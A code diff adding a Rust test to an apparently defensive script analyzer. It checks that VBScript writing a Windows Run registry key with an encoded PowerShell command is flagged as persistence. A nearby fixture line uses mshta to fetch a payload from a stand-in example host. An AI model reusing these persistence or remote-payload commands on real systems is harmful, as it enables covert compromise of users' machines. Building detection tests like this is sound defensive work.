@@ -20665,6 +20665,35 @@ reg.SetStringValue &H80000002, "Software\Microsoft\Windows\CurrentVersion\RunOnc
     }
 
     #[test]
+    fn standalone_vbs_stdregprov_setexpandedstringvalue_run_key_emits_persistence() {
+        let vbs = br#"Set reg = GetObject("winmgmts:\\.\root\default:StdRegProv")
+reg.SetExpandedStringValue &H80000001, "Software\Microsoft\Windows\CurrentVersion\Run", "Expanded", "powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAGUAeABwAGEAbgBkAGUAZAA=""#;
+
+        let report = analyze(vbs, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence {
+                    hive,
+                    key,
+                    value_name,
+                    command,
+                } if hive == "HKCU"
+                    && key == r"Software\Microsoft\Windows\CurrentVersion\Run"
+                    && value_name == "Expanded"
+                    && command == "powershell.exe -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAGUAeABwAGEAbgBkAGUAZAA="
+            )),
+            "no Run-key Persistence from VBS StdRegProv.SetExpandedStringValue: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.extracted_ps1.is_empty(),
+            "StdRegProv SetExpandedStringValue Run value should be routed through powershell"
+        );
+    }
+
+    #[test]
     fn standalone_vbs_stdregprov_setstringvalue_non_run_key_is_not_persistence() {
         let vbs = br#"Set reg = GetObject("winmgmts:\\.\root\default:StdRegProv")
 reg.SetStringValue &H80000001, "Software\Demo", "Value", "mshta https://stdregprov-nonrun.example/payload.hta""#;
